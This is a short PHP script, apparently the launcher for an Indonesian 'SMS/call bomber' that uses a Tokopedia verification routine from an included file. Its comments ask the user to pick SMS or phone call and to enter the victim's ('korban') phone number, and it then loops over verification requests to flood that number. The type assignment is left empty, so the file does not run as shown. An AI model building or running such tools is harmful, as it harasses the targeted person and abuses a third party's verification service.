<?php
include 'tokped.php';

/*
    https://github.com/wardnaa
    Made by Localhost 229
*/

$init = new Bom();

//tols ekslusif  hanya bisa digunakan 3x dalam 1 Jam (sms/call)
$init->type = ; //<--ketik '1 untuk sms' & ketik '2 untuk telepon
$init->no = ""; //<--tulis nomber hp korban (08)

 if ($init->type == 1) {
         for ($i=0; $i < 2; $i++) {
             $init->Verif($init->no,$init->type);
         }
}elseif ($init->type == 2) {
        $init->Verif($init->no,$init->type);
}
